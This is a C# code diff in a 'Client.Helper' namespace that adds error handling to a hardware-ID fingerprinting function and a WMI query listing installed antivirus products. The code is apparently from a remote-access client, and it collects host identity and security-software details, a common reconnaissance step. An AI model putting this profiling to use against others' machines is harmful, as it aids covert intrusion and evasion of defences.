@@ -23,13 +23,21 @@ namespace Client.Helper
 
         public static string HWID()
         {
-            StringBuilder sb = new StringBuilder();
-            sb.Append(Environment.ProcessorCount);
-            sb.Append(Environment.UserName);
-            sb.Append(Environment.MachineName);
-            sb.Append(Environment.OSVersion);
-            sb.Append(new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
-            return GetHash(sb.ToString());
+            try
+            {
+                StringBuilder sb = new StringBuilder();
+                sb.Append(Environment.ProcessorCount);
+                sb.Append(Environment.UserName);
+                sb.Append(Environment.MachineName);
+                sb.Append(Environment.OSVersion);
+                sb.Append(new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
+                return GetHash(sb.ToString());
+
+            }
+            catch
+            {
+                return "Err HWID";
+            }
         }
 
         public static string GetHash(string strToHash)
@@ -78,15 +86,22 @@ namespace Client.Helper
 
         public static string Antivirus()
         {
-            using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
+            try
             {
-                List<string> av = new List<string>();
-                foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
+                using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                 {
-                    av.Add(searchResult["displayName"].ToString());
+                    List<string> av = new List<string>();
+                    foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
+                    {
+                        av.Add(searchResult["displayName"].ToString());
+                    }
+                    if (av.Count == 0) return "N/A";
+                    return string.Join(", ", av.ToArray());
                 }
-                if (av.Count == 0) return "None";
-                return string.Join(", ", av.ToArray());
+            }
+            catch
+            {
+                return "N/A";
             }
         }
 
